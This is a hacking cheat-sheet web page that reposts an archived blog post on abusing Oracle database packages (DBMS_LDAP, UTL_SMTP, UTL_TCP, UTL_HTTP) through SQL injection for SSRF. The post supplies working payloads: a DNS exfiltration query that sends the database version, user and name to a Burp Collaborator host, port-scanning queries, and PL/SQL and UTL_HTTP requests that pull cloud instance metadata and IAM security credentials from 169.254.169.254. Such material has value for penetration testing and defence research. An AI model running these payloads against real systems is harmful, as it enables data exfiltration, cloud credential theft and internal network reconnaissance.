<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Oracle injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="/assets/img/logos/m1N147z1.png?c5fa12f00bf81b0bfdfb738a6722b18c"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/docs/hacking/cheetsheets/SQL-Injection/oracle-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">\ h0m3 / </a> </li> <li class="nav-item active"> <a class="nav-link" href="/docs/">/ d0Cs \ <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">\ bl0g / </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">/ m0Re \ </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><p><strong>Serve this post a wayback machine copy of the deleted post from <a href="https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/">https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/</a></strong>.</p> <h2 id="ssrf">SSRF</h2> <p>Using Oracle to do Out of Band HTTP and DNS requests is well documented but as a means of exfiltrating SQL data in injections. We can always modify these techniques/functions to do other SSRF/XSPA.</p> <p>Installing Oracle can be really painful, especially if you want to set up a quick instance to try out commands. My friend and colleague at <a href="https://appsecco.com">Appsecco</a>, <a href="https://github.com/abhisek">Abhisek Datta</a>, pointed me to <a href="https://github.com/MaksymBilenko/docker-oracle-12c">https://github.com/MaksymBilenko/docker-oracle-12c</a> that allowed me to setup an instance on a t2.large AWS Ubuntu machine and Docker.</p> <p>I ran the docker command with the <code class="language-plaintext highlighter-rouge">--network="host"</code> flag so that I could mimic Oracle as an native install with full network access, for the course of this blogpost.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-d</span> <span class="nt">--network</span><span class="o">=</span><span class="s2">"host"</span> quay.io/maksymbilenko/oracle-12c
</code></pre></div></div> <p><br/></p> <h3 id="oracle-packages-that-support-a-url-or-a-hostnameport-number-specification-">Oracle packages that support a URL or a Hostname/Port Number specification <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a></h3> <p>In order to find any packages and functions that support a host and port specification, I ran a Google search on the <a href="https://docs.oracle.com/database/121/index.html">Oracle Database Online Documentation</a>. Specifically,</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site:docs.oracle.com inurl:<span class="s2">"/database/121/ARPLS"</span> <span class="s2">"host"</span>|<span class="s2">"hostname"</span> <span class="s2">"port"</span>|<span class="s2">"portnum"</span>
</code></pre></div></div> <p>The search returned the following results (not all can be used to perform outbound network)</p> <ul> <li>DBMS_NETWORK_ACL_ADMIN</li> <li>UTL_SMTP</li> <li>DBMS_XDB</li> <li>DBMS_SCHEDULER</li> <li>DBMS_XDB_CONFIG</li> <li>DBMS_AQ</li> <li>UTL_MAIL</li> <li>DBMS_AQELM</li> <li>DBMS_NETWORK_ACL_UTILITY</li> <li>DBMS_MGD_ID_UTL</li> <li>UTL_TCP</li> <li>DBMS_MGWADM</li> <li>DBMS_STREAMS_ADM</li> <li>UTL_HTTP</li> </ul> <p>This crude search obviously skips packages like <code class="language-plaintext highlighter-rouge">DBMS_LDAP</code> (which allows passing a hostname and port number) as <a href="https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360">the documentation page</a> simply points you to a <a href="https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360">different location</a>. Hence, there may be other Oracle packages that can be abused to make outbound requests that I may have missed.</p> <p>In any case, letâ€™s take a look at some of the packages that we have discovered and listed above.</p> <p><strong>DBMS_LDAP.INIT</strong></p> <p>The <code class="language-plaintext highlighter-rouge">DBMS_LDAP</code> package allows for access of data from LDAP servers. The <code class="language-plaintext highlighter-rouge">init()</code> function initializes a session with an LDAP server and takes a hostname and port number as an argument.</p> <p>This function has been documented before to show exfiltration of data over DNS, like below</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">version</span> <span class="k">FROM</span> <span class="n">v</span><span class="err">$</span><span class="n">instance</span><span class="p">)</span><span class="o">||</span><span class="s1">'.'</span><span class="o">||</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">user</span> <span class="k">FROM</span> <span class="n">dual</span><span class="p">)</span><span class="o">||</span><span class="s1">'.'</span><span class="o">||</span><span class="p">(</span><span class="k">select</span> <span class="n">name</span> <span class="k">from</span> <span class="n">V</span><span class="err">$</span><span class="k">database</span><span class="p">)</span><span class="o">||</span><span class="s1">'.'</span><span class="o">||</span><span class="s1">'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net'</span><span class="p">,</span><span class="mi">80</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">dual</span><span class="p">;</span>
</code></pre></div></div> <p>However, given that the function accepts a hostname and a port number as arguments, you can use this to work like a port scanner as well.</p> <p>Here are a few examples</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">22</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">dual</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">25</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">dual</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">80</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">dual</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="n">DBMS_LDAP</span><span class="p">.</span><span class="n">INIT</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">8080</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">dual</span><span class="p">;</span>
</code></pre></div></div> <p>A <code class="language-plaintext highlighter-rouge">ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.</code> shows that the port is closed while a session value points to the port being open.</p> <p><strong>UTL_SMTP</strong></p> <p>The <code class="language-plaintext highlighter-rouge">UTL_SMTP</code> package is designed for sending e-mails over SMTP. The example provided on the <a href="https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478">Oracle documentation site shows how you can use this package to send an email</a>. For us, however, the interesting thing is with the ability to provide a host and port specification.</p> <p>A crude example is shown below with the <code class="language-plaintext highlighter-rouge">UTL_SMTP.OPEN_CONNECTION</code> function, with a timeout of 2 seconds</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DECLARE</span> <span class="k">c</span> <span class="n">utl_smtp</span><span class="p">.</span><span class="k">connection</span><span class="p">;</span>
<span class="k">BEGIN</span>
<span class="k">c</span> <span class="p">:</span><span class="o">=</span> <span class="n">UTL_SMTP</span><span class="p">.</span><span class="n">OPEN_CONNECTION</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
<span class="k">END</span><span class="p">;</span>
</code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DECLARE</span> <span class="k">c</span> <span class="n">utl_smtp</span><span class="p">.</span><span class="k">connection</span><span class="p">;</span>
<span class="k">BEGIN</span>
<span class="k">c</span> <span class="p">:</span><span class="o">=</span> <span class="n">UTL_SMTP</span><span class="p">.</span><span class="n">OPEN_CONNECTION</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
<span class="k">END</span><span class="p">;</span>
</code></pre></div></div> <p>A <code class="language-plaintext highlighter-rouge">ORA-29276: transfer timeout</code> shows port is open but no SMTP connection was estabilished while a <code class="language-plaintext highlighter-rouge">ORA-29278: SMTP transient error: 421 Service not available</code> shows that the port is closed.</p> <p><strong>UTL_TCP</strong></p> <p>The <code class="language-plaintext highlighter-rouge">UTL_TCP</code> package and its procedures and functions allow <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190">TCP/IP based communication with services</a>. If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.</p> <p>The example <a href="https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190">on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page</a>. We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">set</span> <span class="n">serveroutput</span> <span class="k">on</span> <span class="k">size</span> <span class="mi">30000</span><span class="p">;</span>
<span class="k">SET</span> <span class="n">SERVEROUTPUT</span> <span class="k">ON</span>
<span class="k">DECLARE</span> <span class="k">c</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="k">connection</span><span class="p">;</span>
  <span class="n">retval</span> <span class="n">pls_integer</span><span class="p">;</span>
<span class="k">BEGIN</span>
  <span class="k">c</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">open_connection</span><span class="p">(</span><span class="s1">'169.254.169.254'</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="n">tx_timeout</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">retval</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">write_line</span><span class="p">(</span><span class="k">c</span><span class="p">,</span> <span class="s1">'GET /latest/meta-data/ HTTP/1.0'</span><span class="p">);</span>
  <span class="n">retval</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">write_line</span><span class="p">(</span><span class="k">c</span><span class="p">);</span>
  <span class="k">BEGIN</span>
    <span class="n">LOOP</span>
      <span class="n">dbms_output</span><span class="p">.</span><span class="n">put_line</span><span class="p">(</span><span class="n">utl_tcp</span><span class="p">.</span><span class="n">get_line</span><span class="p">(</span><span class="k">c</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">));</span>
    <span class="k">END</span> <span class="n">LOOP</span><span class="p">;</span>
  <span class="n">EXCEPTION</span>
    <span class="k">WHEN</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">end_of_input</span> <span class="k">THEN</span>
      <span class="k">NULL</span><span class="p">;</span>
  <span class="k">END</span><span class="p">;</span>
  <span class="n">utl_tcp</span><span class="p">.</span><span class="n">close_connection</span><span class="p">(</span><span class="k">c</span><span class="p">);</span>
<span class="k">END</span><span class="p">;</span>
<span class="o">/</span>
</code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DECLARE</span> <span class="k">c</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="k">connection</span><span class="p">;</span>
  <span class="n">retval</span> <span class="n">pls_integer</span><span class="p">;</span>
<span class="k">BEGIN</span>
  <span class="k">c</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">open_connection</span><span class="p">(</span><span class="s1">'scanme.nmap.org'</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="n">tx_timeout</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">);</span>
  <span class="n">retval</span> <span class="p">:</span><span class="o">=</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">write_line</span><span class="p">(</span><span class="k">c</span><span class="p">);</span>
  <span class="k">BEGIN</span>
    <span class="n">LOOP</span>
      <span class="n">dbms_output</span><span class="p">.</span><span class="n">put_line</span><span class="p">(</span><span class="n">utl_tcp</span><span class="p">.</span><span class="n">get_line</span><span class="p">(</span><span class="k">c</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">));</span>
    <span class="k">END</span> <span class="n">LOOP</span><span class="p">;</span>
  <span class="n">EXCEPTION</span>
    <span class="k">WHEN</span> <span class="n">utl_tcp</span><span class="p">.</span><span class="n">end_of_input</span> <span class="k">THEN</span>
      <span class="k">NULL</span><span class="p">;</span>
  <span class="k">END</span><span class="p">;</span>
  <span class="n">utl_tcp</span><span class="p">.</span><span class="n">close_connection</span><span class="p">(</span><span class="k">c</span><span class="p">);</span>
<span class="k">END</span><span class="p">;</span>
</code></pre></div></div> <p>Interestingly, due to the ability to craft raw TCP requests, this package can also be used to query the Instance meta-data service of all cloud providers as the method type and additional headers can all be passed within the TCP request.</p> <p><strong>UTL_HTTP and Web Requests</strong></p> <p>Perhaps the most common and widely documented technique in every Out of Band Oracle SQL Injection tutorial out there is the <a href="https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070"><code class="language-plaintext highlighter-rouge">UTL_HTTP</code> package</a>. This package is defined by the documentation as - <code class="language-plaintext highlighter-rouge">The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.</code></p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s1">'http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole'</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
</code></pre></div></div> <p>You could additionally, use this to perform some rudimentary port scanning as well with queries like</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s1">'http://scanme.nmap.org:22'</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
<span class="k">select</span> <span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s1">'http://scanme.nmap.org:8080'</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
<span class="k">select</span> <span class="n">UTL_HTTP</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s1">'http://scanme.nmap.org:25'</span><span class="p">)</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
</code></pre></div></div> <p>A <code class="language-plaintext highlighter-rouge">ORA-12541: TNS:no listener</code> or a <code class="language-plaintext highlighter-rouge">TNS:operation timed out</code> is a sign that the TCP port is closed, whereas a <code class="language-plaintext highlighter-rouge">ORA-29263: HTTP protocol error</code> or data is a sign that the port is open.</p> <p>Another package I have used in the past with varied success is the <a href="https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705"><code class="language-plaintext highlighter-rouge">GETCLOB()</code> method of the <code class="language-plaintext highlighter-rouge">HTTPURITYPE</code> Oracle abstract type</a> that allows you to interact with a URL and provides support for the HTTP protocol. The <code class="language-plaintext highlighter-rouge">GETCLOB()</code> method is used to fetch the GET response from a URL as a <a href="https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html">CLOB data type.</a></p> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> -[47z!Lu7h] -[Love is life. And if you miss love, you miss life. ]-[2025]- </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>